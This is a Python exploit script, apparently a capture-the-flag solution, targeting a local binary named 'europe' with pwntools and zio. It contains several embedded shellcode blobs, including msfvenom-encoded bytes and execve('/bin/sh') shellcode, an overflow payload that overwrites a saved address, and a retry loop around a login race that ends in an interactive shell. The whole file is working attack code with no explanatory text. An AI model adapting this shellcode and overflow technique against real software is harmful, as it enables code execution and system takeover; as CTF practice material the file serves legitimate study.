from zio import *
from pwn import *
import time
import random

context(arch = "i386", os = 'linux')
target = "./europe"
def get_io(target):
	ELF(target)
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def pwn(io):
	message_addr = 0x0804C9A0

	shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
	shellcode += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
	

	#in msfconsole: generate -b "x00\x0f\x0a\x0b" -t python
	shellcode =  ""
	shellcode += "\xbe\xe4\x90\x39\xc2\xda\xcf\xd9\x74\x24\xf4\x5a\x29"
	shellcode += "\xc9\xb1\x0b\x83\xea\xfc\x31\x72\x11\x03\x72\x11\xe2"
	shellcode += "\x11\xfa\x32\x9a\x40\xa9\x22\x72\x5f\x2d\x22\x65\xf7"
	shellcode += "\x9e\x47\x02\x07\x89\x88\xb0\x6e\x27\x5e\xd7\x22\x5f"
	shellcode += "\x68\x18\xc2\x9f\x46\x7a\xab\xf1\xb7\x09\x43\x0e\x9f"
	shellcode += "\xbe\x1a\xef\xd2\xc1"

	#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80";
	#shellcode = "\x31\xc0\x50\x68\x2f\x73\x68\x3b\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80";
	print len(shellcode)
	print disasm(shellcode)
	raw_input(":")

	username = (0x5e0 - len(shellcode)) * 'a'
	username += '\xe3'
	username += 'A' * 3 #avoid overwrite var of i(modify the last byte)
	username += 'A' * (0xC)
	username += p32(message_addr)


	buff = [chr(ord(c) ^ 0x20) for c in username]
	username = "".join(buff)

	username = shellcode + username


	while True:
		io.read_until(" > ")
		io.write("1\n")
		io.read_until("Username: ")
		io.write("guest\n")
		io.read_until("Password: ")
		io.write("guest\n")
		io.read_until(" > ")
		io.write("1\n")
		io.read_until("Username: ")
		io.write(username + "\n")
		io.read_until("Password: ")
		time.sleep(1)
		io.write("admin\n")
		io.read_until(" > ")

		#time.sleep(random.random())
		raw_input(":")
		io.write("3\n")
		data = io.read_until("?")
		if data.find("You're not logged in") == -1:
			break

	io.read_until(" > ")
	io.write("4\n")
	io.interact()

io = get_io(target)
pwn(io)